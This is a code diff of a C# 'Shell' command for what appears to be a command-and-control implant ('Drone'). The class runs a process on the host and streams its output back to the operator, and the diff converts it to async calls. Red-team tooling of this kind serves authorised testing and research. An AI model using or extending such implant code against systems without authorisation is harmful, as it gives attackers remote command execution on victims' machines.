@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Diagnostics;
 using System.Threading;
+using System.Threading.Tasks;
 
 namespace Drone.Commands;
 
@@ -9,7 +10,7 @@ public sealed class Shell : DroneCommand
     public override byte Command => 0x3A;
     public override bool Threaded => true;
 
-    public override void Execute(DroneTask task, CancellationToken cancellationToken)
+    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
     {
         using var process = new Process
         {
@@ -26,9 +27,9 @@ public sealed class Shell : DroneCommand
         };
 
         // inline function
-        void OnDataReceived(object sender, DataReceivedEventArgs e)
+        async void OnDataReceived(object sender, DataReceivedEventArgs e)
         {
-            Drone.SendTaskOutput(new TaskOutput(task.Id, TaskStatus.RUNNING, e.Data + Environment.NewLine));
+            await Drone.SendTaskOutput(new TaskOutput(task.Id, TaskStatus.RUNNING, e.Data + Environment.NewLine));
         }
         
         // send output on data received
@@ -40,7 +41,7 @@ public sealed class Shell : DroneCommand
         process.BeginErrorReadLine();
         
         // send a task running
-        Drone.SendTaskRunning(task.Id);
+        await Drone.SendTaskRunning(task.Id);
         
         // don't use WaitForExit
         while (!process.HasExited)
@@ -57,6 +58,6 @@ public sealed class Shell : DroneCommand
             Thread.Sleep(100);
         }
 
-        Drone.SendTaskComplete(task.Id);
+        await Drone.SendTaskComplete(task.Id);
     }
 }
